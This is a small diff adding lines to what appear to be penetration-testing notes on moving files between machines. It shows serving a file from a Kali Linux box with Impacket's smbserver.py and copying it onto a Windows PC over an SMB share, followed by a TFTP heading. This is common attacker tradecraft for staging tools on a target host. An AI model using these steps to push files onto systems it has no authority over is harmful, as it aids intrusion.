@@ -1,3 +1,9 @@
+On windows pc
+copy \\192.168.1.1\kali\f1.py  # 192.168.1.1-ip_linux_box; kali-sharename; f1.py-file
+
+On linux pc
+python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .  # kali is sharename name; . is our local direcoty; also place your file in the current directoty where . is
+
 
 --------------------------------------
 TFTP
